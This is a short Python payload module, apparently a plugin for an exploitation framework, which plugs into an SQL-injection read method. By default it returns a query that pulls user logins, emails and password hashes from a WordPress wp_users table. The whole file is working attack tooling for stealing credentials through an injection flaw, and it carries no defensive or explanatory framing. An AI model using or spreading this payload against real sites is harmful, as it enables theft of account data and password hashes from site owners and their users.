import os

##
# Dependency
# What dependency does this payload have
def get_methods():
    return ['SQLr']

##
# Detonate payload
# Return the code to execute
# or the file path to be uploaded
def get_instructions(method, args):
    if method == 'SQLr':
        # If we have SQLi
        if args.pos:
            return args.pos
        else:
            return [
                "SELECT user_login, user_email, pass_hash FROM wp_users LIMIT 5;",
            ]
##
# Author of this payload
def get_author():
    return "@etragardh"

##
# Special thanks to:
def get_thanks():
    return False

